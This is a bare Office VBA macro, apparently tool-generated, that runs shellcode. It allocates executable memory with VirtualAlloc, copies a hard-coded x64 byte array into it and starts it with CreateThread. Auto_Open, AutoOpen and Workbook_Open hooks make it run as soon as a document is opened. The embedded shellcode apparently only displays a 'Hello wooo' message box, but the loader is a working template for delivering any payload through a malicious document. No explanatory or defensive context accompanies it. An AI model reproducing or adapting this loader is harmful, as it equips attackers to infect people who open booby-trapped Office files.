#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Wvozgdig As Long, ByVal Rwitsssks As Long, ByVal Rgpjkjcbb As LongPtr, Gmms As Long, ByVal Ejl As Long, Juepu As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Qibwux As Long, ByVal Cvpcrrgb As Long, ByVal Nsdkz As Long, ByVal Mklwzhexg As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dadnavpyv As LongPtr, ByRef Teqpnngnp As Any, ByVal Gwqa As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Wvozgdig As Long, ByVal Rwitsssks As Long, ByVal Rgpjkjcbb As Long, Gmms As Long, ByVal Ejl As Long, Juepu As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Qibwux As Long, ByVal Cvpcrrgb As Long, ByVal Nsdkz As Long, ByVal Mklwzhexg As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dadnavpyv As Long, ByRef Teqpnngnp As Any, ByVal Gwqa As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Iiz As Long, Kyltmxy As Variant, Xelshlv As Long
#If Vba7 Then
	Dim  Qjnplydx As LongPtr, Kllc As LongPtr
#Else
	Dim  Qjnplydx As Long, Kllc As Long
#EndIf
	Kyltmxy = Array(252,72,129,228,240,255,255,255,232,204,0,0,0,65,81,65,80,82,72,49,210,101,72,139,82,96,72,139,82,24,81,72,139,82,32,86,65,185,145,51,219,132,72,15,183,74,72,72,139,114,80,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72, _
1,208,102,129,120,24,11,2,15,133,111,0,0,0,139,128,136,0,0,0,72,133,192,116,100,72,1,208,80,68,139,64,32,73,1,208,139,72,24,227,83,72,255,201,65,139,52,136,68,139,76,36,8,72,1,214,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,69,57,209,117,219,88,68,139,64, _
36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,65,88,72,1,208,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,232,11,0,0,0,117,115,101,114,51,50,46,100,108,108,0,89,65,186,153,31,154,100, _
255,213,73,199,193,0,0,0,0,232,11,0,0,0,72,101,108,108,111,32,119,111,111,111,0,90,232,8,0,0,0,119,101,108,99,111,109,101,0,65,88,72,49,201,65,186,52,62,165,214,255,213,72,49,201,65,186,27,125,216,27,255,213)

	Qjnplydx = VirtualAlloc(0, UBound(Kyltmxy), &H1000, &H40)
	For Xelshlv = LBound(Kyltmxy) To UBound(Kyltmxy)
		Iiz = Kyltmxy(Xelshlv)
		Kllc = RtlMoveMemory(Qjnplydx + Xelshlv, Iiz, 1)
	Next Xelshlv
	Kllc = CreateThread(0, 0, Qjnplydx, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

